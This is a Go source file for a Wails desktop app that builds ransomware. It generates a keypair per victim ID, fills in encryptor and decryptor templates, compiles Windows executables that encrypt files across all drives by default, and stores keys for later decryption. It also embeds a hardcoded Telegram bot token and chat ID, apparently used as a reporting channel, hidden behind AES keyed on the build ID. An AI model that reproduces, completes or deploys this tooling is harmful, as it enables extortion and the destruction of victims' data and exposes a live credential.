package main

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"text/template"
	"time"

	wailsRuntime "github.com/wailsapp/wails/v2/pkg/runtime"
)

type KeyData struct {
	ID              string
	PublicKeyBytes  string
	PrivateKeyBytes string
	EncryptedToken  string
	EncryptedChatID string
}

type BuildResult struct {
	ID        string `json:"id"`
	EncFile   string `json:"encFile"`
	DecFile   string `json:"decFile"`
	KeyFile   string `json:"keyFile"`
	Timestamp string `json:"timestamp"`
	Success   bool   `json:"success"`
	Error     string `json:"error,omitempty"`
}

// BuildInfo describes a previously generated build found on disk.
type BuildInfo struct {
	ID        string `json:"id"`
	EncFile   string `json:"encFile"`
	DecFile   string `json:"decFile"`
	KeyFile   string `json:"keyFile"`
	EncSize   string `json:"encSize"`
	DecSize   string `json:"decSize"`
	Timestamp string `json:"timestamp"`
}

// App is the primary application struct bound to the Wails frontend.
type App struct {
	ctx        context.Context
	projectDir string
}

// NewApp creates a new App instance.
func NewApp() *App {
	return &App{}
}

func (a *App) startup(ctx context.Context) {
	a.ctx = ctx
	a.projectDir = a.findProjectDir()
}

// requiredFiles lists the files that must exist in a valid project directory.
var requiredFiles = []string{"encryptor_template.go", "decryptor_template.go", "bg.jpeg", "go.mod"}

func (a *App) findProjectDir() string {
	// 1. Check CWD
	if cwd, err := os.Getwd(); err == nil && a.hasTemplates(cwd) {
		return cwd
	}
	// 2. Check exe directory
	if exe, err := os.Executable(); err == nil {
		exeDir := filepath.Dir(exe)
		if a.hasTemplates(exeDir) {
			return exeDir
		}
		// 3. Check parent of exe dir (gui/ → project root)
		parent := filepath.Dir(exeDir)
		if a.hasTemplates(parent) {
			return parent
		}
	}
	return ""
}

func (a *App) hasTemplates(dir string) bool {
	for _, f := range requiredFiles {
		if _, err := os.Stat(filepath.Join(dir, f)); os.IsNotExist(err) {
			return false
		}
	}
	return true
}

func (a *App) emitLog(msg, logType string) {
	wailsRuntime.EventsEmit(a.ctx, "log", map[string]string{
		"message": msg,
		"type":    logType,
		"time":    time.Now().Format("15:04:05"),
	})
}

// GetProjectDir returns the detected project directory path.
func (a *App) GetProjectDir() string {
	return a.projectDir
}

// SelectProjectDir opens a native folder picker for the project directory.
func (a *App) SelectProjectDir() string {
	dir, err := wailsRuntime.OpenDirectoryDialog(a.ctx, wailsRuntime.OpenDialogOptions{
		Title: "Select Project Directory (containing templates)",
	})
	if err != nil || dir == "" {
		return ""
	}
	if a.hasTemplates(dir) {
		a.projectDir = dir
		return dir
	}
	return ""
}

// SelectFolder opens a native folder picker for target encryption/decryption.
func (a *App) SelectFolder() string {
	dir, err := wailsRuntime.OpenDirectoryDialog(a.ctx, wailsRuntime.OpenDialogOptions{
		Title: "Select Target Folder",
	})
	if err != nil || dir == "" {
		return ""
	}
	return dir
}

// Generate creates a new keypair, builds encryptor & decryptor executables.
func (a *App) Generate() BuildResult {
	if a.projectDir == "" {
		return BuildResult{Error: "Project directory not set. Please select project directory first."}
	}

	// 1. Check bg.jpeg
	bgPath := filepath.Join(a.projectDir, "bg.jpeg")
	if _, err := os.Stat(bgPath); os.IsNotExist(err) {
		a.emitLog("ERROR: bg.jpeg not found in project directory", "error")
		return BuildResult{Error: "bg.jpeg not found"}
	}

	// 2. Generate ECDH X25519 keypair
	a.emitLog("Generating X25519 keypair...", "info")
	priv, pub, err := a.generateKeypair()
	if err != nil {
		a.emitLog("ERROR: "+err.Error(), "error")
		return BuildResult{Error: err.Error()}
	}

	// 3. Generate random 8-digit ID
	id, err := a.generateID()
	if err != nil {
		a.emitLog("ERROR: "+err.Error(), "error")
		return BuildResult{Error: err.Error()}
	}
	a.emitLog(fmt.Sprintf("Generated ID: %s", id), "success")

	// 4. Encrypt credentials
	data, err := a.prepareKeyData(id, priv, pub)
	if err != nil {
		a.emitLog("ERROR: "+err.Error(), "error")
		return BuildResult{Error: err.Error()}
	}

	// 5. Process templates and build binaries
	result, err := a.buildAll(id, data, priv, pub)
	if err != nil {
		a.emitLog("ERROR: "+err.Error(), "error")
		return BuildResult{Error: err.Error()}
	}

	a.emitLog("Build completed successfully!", "success")
	return result
}

func (a *App) generateKeypair() (*ecdh.PrivateKey, *ecdh.PublicKey, error) {
	priv, err := ecdh.X25519().GenerateKey(rand.Reader)
	if err != nil {
		return nil, nil, fmt.Errorf("keypair generation failed: %w", err)
	}
	return priv, priv.PublicKey(), nil
}

func (a *App) generateID() (string, error) {
	idBytes := make([]byte, 4)
	if _, err := rand.Read(idBytes); err != nil {
		return "", fmt.Errorf("ID generation failed: %w", err)
	}
	raw := (int(idBytes[0])<<24 | int(idBytes[1])<<16 | int(idBytes[2])<<8 | int(idBytes[3])) % 100000000
	id := fmt.Sprintf("%08d", raw)
	if len(id) > 8 {
		id = id[:8]
	}
	return id, nil
}

func (a *App) prepareKeyData(id string, priv *ecdh.PrivateKey, pub *ecdh.PublicKey) (KeyData, error) {
	originalToken := "8377619914:AAGDSBXt-DtgqJRMFdxIxEo2NvxI9EuS5S8"
	originalChatID := "5640449716"

	encToken, err := encryptString(originalToken, id)
	if err != nil {
		return KeyData{}, fmt.Errorf("failed to encrypt token: %w", err)
	}
	encChatID, err := encryptString(originalChatID, id)
	if err != nil {
		return KeyData{}, fmt.Errorf("failed to encrypt chat ID: %w", err)
	}

	return KeyData{
		ID:              id,
		PublicKeyBytes:  formatByteSlice(pub.Bytes()),
		PrivateKeyBytes: formatByteSlice(priv.Bytes()),
		EncryptedToken:  encToken,
		EncryptedChatID: encChatID,
	}, nil
}

func (a *App) buildAll(id string, data KeyData, priv *ecdh.PrivateKey, pub *ecdh.PublicKey) (BuildResult, error) {
	// Process encryptor template
	a.emitLog("Processing encryptor template...", "info")
	encGenPath := filepath.Join(a.projectDir, "encryptor_gen.go")
	if err := processTemplate(filepath.Join(a.projectDir, "encryptor_template.go"), encGenPath, data); err != nil {
		return BuildResult{}, fmt.Errorf("encryptor template error: %w", err)
	}
	defer os.Remove(encGenPath)

	// Process decryptor template
	a.emitLog("Processing decryptor template...", "info")
	decGenPath := filepath.Join(a.projectDir, "decryptor_gen.go")
	if err := processTemplate(filepath.Join(a.projectDir, "decryptor_template.go"), decGenPath, data); err != nil {
		return BuildResult{}, fmt.Errorf("decryptor template error: %w", err)
	}
	defer os.Remove(decGenPath)

	// Build encryptor
	outEnc := fmt.Sprintf("e_%s.exe", id)
	a.emitLog(fmt.Sprintf("Building encryptor: %s ...", outEnc), "info")
	if err := a.buildBinary(outEnc, "encryptor_gen.go"); err != nil {
		return BuildResult{}, err
	}
	a.emitLog(fmt.Sprintf("✓ Encryptor built: %s", outEnc), "success")

	// Build decryptor
	outDec := fmt.Sprintf("d_%s.exe", id)
	a.emitLog(fmt.Sprintf("Building decryptor: %s ...", outDec), "info")
	if err := a.buildBinary(outDec, "decryptor_gen.go"); err != nil {
		return BuildResult{}, err
	}
	a.emitLog(fmt.Sprintf("✓ Decryptor built: %s", outDec), "success")

	// Save key file
	keyFile := fmt.Sprintf("%s.txt", id)
	keyContent := fmt.Sprintf(
		"ID: %s\nPublic Key (bytes): %s\nPrivate Key (bytes): %s\n\nPublic Key (hex): %x\nPrivate Key (hex): %x\n",
		id, data.PublicKeyBytes, data.PrivateKeyBytes, pub.Bytes(), priv.Bytes(),
	)
	if err := os.WriteFile(filepath.Join(a.projectDir, keyFile), []byte(keyContent), 0644); err != nil {
		a.emitLog(fmt.Sprintf("Warning: failed to save key file: %v", err), "warning")
	}
	a.emitLog(fmt.Sprintf("✓ Keys saved: %s", keyFile), "success")

	return BuildResult{
		ID:        id,
		EncFile:   outEnc,
		DecFile:   outDec,
		KeyFile:   keyFile,
		Timestamp: time.Now().Format("2006-01-02 15:04:05"),
		Success:   true,
	}, nil
}

func (a *App) buildBinary(output, source string) error {
	cmd := exec.Command("go", "build", "-o", output, source)
	cmd.Dir = a.projectDir
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("build failed for %s: %s\n%s", output, err, string(out))
	}
	return nil
}

func (a *App) GetBuilds() []BuildInfo {
	if a.projectDir == "" {
		return nil
	}

	encFiles, _ := filepath.Glob(filepath.Join(a.projectDir, "e_*.exe"))
	builds := make([]BuildInfo, 0, len(encFiles))

	for _, encPath := range encFiles {
		name := filepath.Base(encPath)
		id := strings.TrimPrefix(strings.TrimSuffix(name, ".exe"), "e_")
		builds = append(builds, a.buildInfoForID(id, encPath))
	}

	sort.Slice(builds, func(i, j int) bool {
		return builds[i].Timestamp > builds[j].Timestamp
	})

	return builds
}

func (a *App) buildInfoForID(id, encPath string) BuildInfo {
	decPath := filepath.Join(a.projectDir, fmt.Sprintf("d_%s.exe", id))
	keyPath := filepath.Join(a.projectDir, fmt.Sprintf("%s.txt", id))

	info := BuildInfo{
		ID:      id,
		EncFile: filepath.Base(encPath),
	}

	if fi, err := os.Stat(encPath); err == nil {
		info.EncSize = formatFileSize(fi.Size())
		info.Timestamp = fi.ModTime().Format("2006-01-02 15:04")
	}
	if fi, err := os.Stat(decPath); err == nil {
		info.DecFile = filepath.Base(decPath)
		info.DecSize = formatFileSize(fi.Size())
	}
	if _, err := os.Stat(keyPath); err == nil {
		info.KeyFile = filepath.Base(keyPath)
	}

	return info
}

func (a *App) RunEncryptor(id, folder string) string {
	if a.projectDir == "" {
		return "Project directory not set"
	}

	exe := filepath.Join(a.projectDir, fmt.Sprintf("e_%s.exe", id))
	if _, err := os.Stat(exe); os.IsNotExist(err) {
		a.emitLog("ERROR: Encryptor not found: "+exe, "error")
		return "Encryptor not found"
	}

	targetDesc := folder
	if targetDesc == "" {
		targetDesc = "ALL DRIVES (default mode)"
	}
	result, err := wailsRuntime.MessageDialog(a.ctx, wailsRuntime.MessageDialogOptions{
		Type:    wailsRuntime.QuestionDialog,
		Title:   "⚠ Confirm Encryption",
		Message: fmt.Sprintf("Encrypt all files in:\n%s\n\nThis cannot be undone without the decryptor!", targetDesc),
	})
	if err != nil || result != "Yes" {
		a.emitLog("Operation cancelled by user", "warning")
		return "cancelled"
	}

	return a.runExe(exe, id, "encryptor", folder)
}

func (a *App) RunDecryptor(id, ext, folder string) string {
	if a.projectDir == "" {
		return "Project directory not set"
	}
	if ext == "" {
		return "Extension is required"
	}

	exe := filepath.Join(a.projectDir, fmt.Sprintf("d_%s.exe", id))
	if _, err := os.Stat(exe); os.IsNotExist(err) {
		a.emitLog("ERROR: Decryptor not found: "+exe, "error")
		return "Decryptor not found"
	}

	args := []string{ext}
	if folder != "" {
		args = append(args, folder)
		a.emitLog(fmt.Sprintf("▶ Running decryptor %s (ext: .%s) on: %s", id, ext, folder), "info")
	} else {
		a.emitLog(fmt.Sprintf("▶ Running decryptor %s (ext: .%s) on: ALL DRIVES", id, ext), "info")
	}

	return a.runExeWithArgs(exe, id, "decryptor", args)
}

func (a *App) runExe(exe, id, label, folder string) string {
	var args []string
	if folder != "" {
		a.emitLog(fmt.Sprintf("▶ Running %s %s on: %s", label, id, folder), "info")
		args = []string{folder}
	} else {
		a.emitLog(fmt.Sprintf("▶ Running %s %s on: ALL DRIVES", label, id), "info")
	}
	return a.runExeWithArgs(exe, id, label, args)
}

func (a *App) runExeWithArgs(exe, id, label string, args []string) string {
	cmd := exec.Command(exe, args...)
	cmd.Dir = a.projectDir
	output, err := cmd.CombinedOutput()

	for _, line := range strings.Split(strings.TrimSpace(string(output)), "\n") {
		line = strings.TrimSpace(line)
		if line != "" {
			a.emitLog(line, "output")
		}
	}

	if err != nil {
		a.emitLog(fmt.Sprintf("✗ %s exited with error: %s", strings.Title(label), err.Error()), "error")
		return "error"
	}

	a.emitLog(fmt.Sprintf("✓ %s completed successfully", strings.Title(label)), "success")
	return "ok"
}

func encryptString(plain, id string) (string, error) {
	key := sha256.Sum256([]byte(id))
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, []byte(plain), nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func formatByteSlice(b []byte) string {
	var sb strings.Builder
	sb.WriteString("{")
	for i, v := range b {
		if i > 0 {
			sb.WriteString(", ")
		}
		fmt.Fprintf(&sb, "%d", v)
	}
	sb.WriteString("}")
	return sb.String()
}

func processTemplate(tmplFile, outFile string, data KeyData) error {
	tmpl, err := template.ParseFiles(tmplFile)
	if err != nil {
		return err
	}
	f, err := os.Create(outFile)
	if err != nil {
		return err
	}
	defer f.Close()
	return tmpl.Execute(f, data)
}

func formatFileSize(b int64) string {
	const (
		KB = 1024
		MB = 1024 * KB
		GB = 1024 * MB
	)
	switch {
	case b >= GB:
		return fmt.Sprintf("%.1f GB", float64(b)/float64(GB))
	case b >= MB:
		return fmt.Sprintf("%.1f MB", float64(b)/float64(MB))
	case b >= KB:
		return fmt.Sprintf("%.1f KB", float64(b)/float64(KB))
	default:
		return fmt.Sprintf("%d B", b)
	}
}
